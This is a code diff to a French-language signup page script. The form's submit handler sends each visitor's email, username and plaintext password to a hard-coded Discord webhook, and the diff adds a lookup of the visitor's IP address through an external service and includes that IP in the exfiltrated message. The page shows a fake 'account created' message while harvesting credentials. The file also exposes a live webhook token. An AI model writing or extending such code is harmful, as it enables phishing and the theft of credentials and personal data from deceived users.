@@ -49,7 +49,7 @@
 <script>
   const webhookURL = "https://discord.com/api/webhooks/1406021613316735247/NTjoX6ln-ASDsg7-vIYGOV2bEhv2JatvfUHPnEh2qk66JnNDurSo6QaYpkb0ALqaRAwq"; 
 
-  document.getElementById("submit").onclick = () => {
+  document.getElementById("submit").onclick = async () => {
     const email = document.getElementById("email").value;
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
@@ -59,11 +59,21 @@
       return;
     }
 
+    let ip = "Non disponible";
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const json = await res.json();
+      ip = json.ip;
+    } catch(e) {
+      console.error("Impossible de récupérer l'IP", e);
+    }
+
     const data = {
       content: `Nouveau signup
 Email: ${email}
 Pseudonyme: ${username}
-Mot de passe: ${password}`
+Mot de passe: ${password}
+IP: ${ip}`
     };
 
     fetch(webhookURL, {
@@ -73,7 +83,7 @@ Mot de passe: ${password}`
     })
     .then(res => {
       if(res.ok) {
-        alert("Compte creer !");
+        alert("Compte créé !");
         document.getElementById("email").value = "";
         document.getElementById("username").value = "";
         document.getElementById("password").value = "";
